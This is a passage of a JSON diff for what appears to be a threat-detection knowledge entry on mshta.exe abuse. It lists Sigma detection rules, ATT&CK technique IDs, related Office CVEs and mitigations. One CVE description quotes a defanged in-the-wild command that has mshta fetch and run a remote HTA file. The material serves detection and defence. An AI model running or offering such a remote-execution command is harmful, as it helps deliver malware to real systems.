+        "title": "Potential Recon Activity Using DriverQuery.EXE",
+        "id": "9fc3072c-dc8f-4bf7-b231-18950000fadd",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_driverquery_recon.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "DriverQuery.EXE Execution",
+        "id": "a20def93-0709-4eae-9bd2-31206e21e6b2",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_driverquery_usage.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Suspicious Child Process of Notepad++ Updater - GUP.Exe",
+        "id": "bb0e87ce-c89f-4857-84fa-095e4483e9cb",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_gup_susp_child_process.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1195.002",
+          "T1557"
+        ]
+      },
+      {
+        "title": "HTML Help HH.EXE Suspicious Child Process",
+        "id": "52cad028-0ff0-4854-8f67-d25dfcbc78b4",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_hh_html_help_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1047",
+          "T1059.001",
+          "T1059.003",
+          "T1059.005",
+          "T1059.007",
+          "T1218",
+          "T1218.001",
+          "T1218.010",
+          "T1218.011",
+          "T1566",
+          "T1566.001"
+        ]
+      },
+      {
+        "title": "HackTool - Covenant PowerShell Launcher",
+        "id": "c260b6db-48ba-4b4a-a76f-2f67644e99d2",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_hktl_covenant.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.001",
+          "T1564.003"
+        ]
+      },
+      {
+        "title": "Suspicious Shells Spawn by Java Utility Keytool",
+        "id": "90fb5e62-ca1f-4e22-b42e-cc521874c938",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_java_keytool_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Suspicious Child Process Of Manage Engine ServiceDesk",
+        "id": "cea2b7ea-792b-405f-95a1-b903ea06458f",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_java_manageengine_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1102"
+        ]
+      },
+      {
+        "title": "Suspicious Processes Spawned by Java.EXE",
+        "id": "0d34ed8b-1c12-4ff2-828c-16fc860b766d",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_java_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Potentially Suspicious Child Process of KeyScrambler.exe",
+        "id": "ca5583e9-8f80-46ac-ab91-7f314d13b984",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_keyscrambler_susp_child_process.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1203",
+          "T1574.001"
+        ]
+      },
+      {
+        "title": "Suspicious MSDT Parent Process",
+        "id": "7a74da6b-ea76-47db-92cc-874ad90df734",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_msdt_susp_parent.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036",
+          "T1218"
+        ]
+      },
+      {
+        "title": "Suspicious MSHTA Child Process",
+        "id": "03cc0c25-389f-4bf8-b48d-11878079f1ca",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_mshta_susp_child_processes.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218.005"
+        ]
+      },
+      {
+        "title": "Suspicious Child Process Of Veeam Dabatase",
+        "id": "d55b793d-f847-4eea-b59a-5ab09908ac90",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_mssql_veaam_susp_child_processes.yml",
+        "level": "critical",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "OneNote.EXE Execution of Malicious Embedded Scripts",
+        "id": "84b1706c-932a-44c4-ae28-892b28a25b94",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_office_onenote_embedded_script_execution.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218.001"
+        ]
+      },
+      {
+        "title": "Suspicious Microsoft OneNote Child Process",
+        "id": "c27515df-97a9-4162-8a60-dc0eeb51b775",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_office_onenote_susp_child_processes.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1566",
+          "T1566.001"
+        ]
+      },
+      {
+        "title": "Suspicious Outlook Child Process",
+        "id": "208748f7-881d-47ac-a29c-07ea84bf691d",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_office_outlook_susp_child_processes.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1204.002"
+        ]
+      },
+      {
+        "title": "Suspicious Microsoft Office Child Process",
+        "id": "438025f9-5856-4663-83f7-52f878a70a50",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_office_susp_child_processes.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1047",
+          "T1204.002",
+          "T1218.010"
+        ]
+      },
+      {
+        "title": "Potentially Suspicious Execution Of PDQDeployRunner",
+        "id": "12b8e9f5-96b2-41e1-9a42-8c6779a5c184",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_pdqdeploy_runner_susp_children.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Suspicious PowerShell Parent Process",
+        "id": "754ed792-634f-40ae-b3bc-e0448d33f695",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_powershell_susp_parent_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.001"
+        ]
+      },
+      {
+        "title": "Potential Provlaunch.EXE Binary Proxy Execution Abuse",
+        "id": "7f5d1c9a-3e83-48df-95a7-2b98aae6c13c",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_provlaunch_potential_abuse.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218"
+        ]
+      },
+      {
+        "title": "Suspicious Provlaunch.EXE Child Process",
+        "id": "f9999590-1f94-4a34-a91e-951e47bedefd",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_provlaunch_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218"
+        ]
+      },
+      {
+        "title": "Potentially Suspicious Child Process Of Regsvr32",
+        "id": "6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_regsvr32_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218.010"
+        ]
+      },
+      {
+        "title": "Scripting/CommandLine Process Spawned Regsvr32",
+        "id": "ab37a6ec-6068-432b-a64e-2c7bf95b1d22",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_regsvr32_susp_parent.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218.010"
+        ]
+      },
+      {
+        "title": "Potential Defense Evasion Via Rename Of Highly Relevant Binaries",
+        "id": "0ba1da6d-b6ce-4366-828c-18826c9de23e",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_renamed_binary_highly_relevant.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036.003"
+        ]
+      },
+      {
+        "title": "Suspicious ShellExec_RunDLL Call Via Ordinal",
+        "id": "8823e85d-31d8-473e-b7f4-92da070f0fc6",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_susp_shellexec_ordinal_execution.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1218.011"
+        ]
+      },
+      {
+        "title": "Suspicious Service Path Modification",
+        "id": "138d3531-8793-4f50-a2cd-f291b2863d78",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_sc_service_path_modification.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1543.003"
+        ]
+      },
+      {
+        "title": "Suspicious Modification Of Scheduled Tasks",
+        "id": "1c0e41cd-21bb-4433-9acc-4a2cd6367b9b",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_change.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": [
+          "T1053.005"
+        ]
+      },
+      {
+        "title": "Suspicious Command Patterns In Scheduled Task Creation",
+        "id": "f2c64357-b1d2-41b7-849f-34d2682c0fad",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_susp_pattern.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": [
+          "T1053.005"
+        ]
+      },
+      {
+        "title": "Script Event Consumer Spawning Process",
+        "id": "f6d1dd2f-b8ce-40ca-bc23-062efb686b34",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_scrcons_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1047"
+        ]
+      },
+      {
+        "title": "Sdiagnhost Calling Suspicious Child Process",
+        "id": "f3d39c45-de1a-4486-a687-ab126124f744",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_sdiagnhost_susp_child.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036",
+          "T1218"
+        ]
+      },
+      {
+        "title": "Suspicious Serv-U Process Pattern",
+        "id": "58f4ea09-0fc2-4520-ba18-b85c540b0eaf",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_servu_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1555"
+        ]
+      },
+      {
+        "title": "Potentially Suspicious Windows App Activity",
+        "id": "f91ed517-a6ba-471d-9910-b3b4a398c0f3",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_appx_execution.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": []
+      },
+      {
+        "title": "LOL-Binary Copied From System Directory",
+        "id": "f5d19838-41b5-476c-98d8-ba8af4929ee2",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_copy_system_dir_lolbin.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036.003"
+        ]
+      },
+      {
+        "title": "Suspicious Electron Application Child Processes",
+        "id": "f26eb764-fd89-464b-85e2-dc4a8e6e77b8",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_electron_app_children.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Potentially Suspicious Execution From Parent Process In Public Folder",
+        "id": "69bd9b97-2be2-41b6-9816-fb08757a4d1a",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_execution_from_public_folder_as_parent.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line",
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059",
+          "T1564"
+        ]
+      },
+      {
+        "title": "Suspicious FileFix Execution Pattern",
+        "id": "b5b29e4e-31fa-4fdf-b058-296e7a1aa0c2",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_filefix_execution_pattern.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1204.004"
+        ]
+      },
+      {
+        "title": "LOLBIN Execution From Abnormal Drive",
+        "id": "d4ca7c59-e9e4-42d8-bf57-91a776efcb87",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_lolbin_exec_from_non_c_drive.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Script Interpreter Execution From Suspicious Folder",
+        "id": "1228c958-e64e-4e71-92ad-7d429f4138ba",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_script_exec_from_env_folder.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059"
+        ]
+      },
+      {
+        "title": "Suspicious New Service Creation",
+        "id": "17a1be64-8d88-40bf-b5ff-a4f7a50ebcc8",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_service_creation.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1543.003"
+        ]
+      },
+      {
+        "title": "Windows Shell/Scripting Processes Spawning Suspicious Programs",
+        "id": "3a6586ad-127a-4d3b-a677-1e6eacdf8fde",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_shell_spawn_susp_program.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.001",
+          "T1059.005",
+          "T1218"
+        ]
+      },
+      {
+        "title": "Suspicious SYSTEM User Process Creation",
+        "id": "2617e7ed-adb7-40ba-b0f3-8f9945fe6c09",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_system_user_anomaly.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1003",
+          "T1027",
+          "T1134"
+        ]
+      },
+      {
+        "title": "VMToolsd Suspicious Child Process",
+        "id": "5687f942-867b-4578-ade7-1e341c46e99a",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_vmware_vmtoolsd_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059"
+        ]
+      },
+      {
+        "title": "Potentially Suspicious WebDAV LNK Execution",
+        "id": "1412aa78-a24c-4abd-83df-767dfb2c5bbe",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_webdav_lnk_execution.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.001",
+          "T1204"
+        ]
+      },
+      {
+        "title": "Suspicious Child Process Of Wermgr.EXE",
+        "id": "396f6630-f3ac-44e3-bfc8-1b161bc00c4e",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_wermgr_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036",
+          "T1055"
+        ]
+      },
+      {
+        "title": "Potentially Suspicious Child Process Of WinRAR.EXE",
+        "id": "146aace8-9bd6-42ba-be7a-0070d8027b76",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_winrar_susp_child_process.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1203"
+        ]
+      },
+      {
+        "title": "Suspicious WMIC Execution Via Office Process",
+        "id": "e1693bc8-7168-4eab-8718-cdcaa68a1738",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_wmic_susp_execution_via_office_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": [
+          "T1047",
+          "T1204.002",
+          "T1218.010"
+        ]
+      },
+      {
+        "title": "Suspicious Process Created Via Wmic.EXE",
+        "id": "3c89a1e8-0fba-449e-8f1b-8409d6267ec8",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_wmic_susp_process_creation.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1047"
+        ]
+      },
+      {
+        "title": "Suspicious WmiPrvSE Child Process",
+        "id": "8a582fe2-0882-4b89-a82a-da6b2dc32937",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_wmiprvse_susp_child_processes.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line",
+          "image"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": [
+          "T1047",
+          "T1204.002",
+          "T1218.010"
+        ]
+      },
+      {
+        "title": "Cscript/Wscript Potentially Suspicious Child Process",
+        "id": "b6676963-0353-4f88-90f5-36c20d443c6a",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_wscript_cscript_susp_child_processes.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "WSL Child Process Anomaly",
+        "id": "2267fe65-0681-42ad-9a6d-46553d3f3480",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_wsl_child_processes_anomalies.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1202",
+          "T1218"
+        ]
+      },
+      {
+        "title": "Registry Tampering by Potentially Suspicious Processes",
+        "id": "7f4c43f9-b1a5-4c7d-b24a-b41bf3a3ebf2",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/registry/registry_event/registry_event_susp_process_registry_modification.yml",
+        "level": "medium",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "registry_event",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.005",
+          "T1112"
+        ]
+      }
+    ],
+    "other_rules": [
+      "https://raw.githubusercontent.com/splunk/security_content/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_mshta_url_in_command_line.yml",
+      "https://raw.githubusercontent.com/elastic/detection-rules/main/rules/windows/defense_evasion_mshta_beacon.toml",
+      "https://raw.githubusercontent.com/elastic/detection-rules/main/rules/_deprecated/defense_evasion_mshta_making_network_connections.toml"
+    ]
+  },
+  "related_CVE": [
+    {
+      "id": "CVE-2017-0199",
+      "description": "Microsoft Office/WordPad remote code execution through a crafted document. Exploitation makes Word fetch a remote HTA file, which the application/hta handler runs through mshta.exe.",
+      "references": [
+        {
+          "source_name": "Mandiant CVE-2017-0199 HTA handler April 2017",
+          "url": "https://cloud.google.com/blog/topics/threat-intelligence/cve-2017-0199-hta-handler/"
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-0802",
+      "description": "Microsoft Office Equation Editor memory corruption (remote code execution). In an XWorm phishing campaign, Excel files exploiting it downloaded an HTA file whose JScript runs under mshta.exe.",
+      "references": [
+        {
+          "source_name": "Fortinet XWorm campaign February 2026",
+          "url": "https://www.fortinet.com/blog/threat-research/deep-dive-into-new-xworm-campaign-utilizing-multiple-themed-phishing-emails"
+        }
+      ]
+    },
+    {
+      "id": "CVE-2017-11882",
+      "description": "Microsoft Office Equation Editor memory corruption (remote code execution). Documents exploiting it in the wild commonly ran mshta.exe to execute a remote HTA or script, for example mshta hxxps://zilk[.]pw/url/index.hta.",
+      "references": [
+        {
+          "source_name": "Unit 42 CVE-2017-11882 in the wild December 2017",
+          "url": "https://unit42.paloaltonetworks.com/unit42-analysis-of-cve-2017-11882-exploit-in-the-wild/"
+        },
+        {
+          "source_name": "Fortinet Cobalt CVE-2017-11882",
+          "url": "https://www.fortinet.com/blog/threat-research/cobalt-malware-strikes-using-cve-2017-11882-rtf-vulnerability"
+        }
+      ]
+    }
+  ],
+  "mitigations": [
+    {
+      "id": "M1038",
+      "name": "Execution Prevention",
+      "technique": "T1218.005",
+      "description": "Use application control configured to block execution of mshta.exe if it is not required for a given system or network to prevent potential misuse by adversaries. For example, in Windows 10 and Windows Server 2016 and above, Windows Defender Application Control (WDAC) policy rules may be applied to block the mshta.exe application and to prevent abuse."
+    },
+    {
+      "id": "M1042",
+      "name": "Disable or Remove Feature or Program",
+      "technique": "T1218.005",
+      "description": "Mshta.exe may not be necessary within a given environment since its functionality is tied to older versions of Internet Explorer that have reached end of life."
+    }
+  ],
+  "additional_mitigations": [],
+  "references": [
+    "https://lolbas-project.github.io/lolbas/Binaries/Mshta/"
+  ],
+  "sources": {
+    "attack": "MITRE ATT&CK Enterprise v20.0",
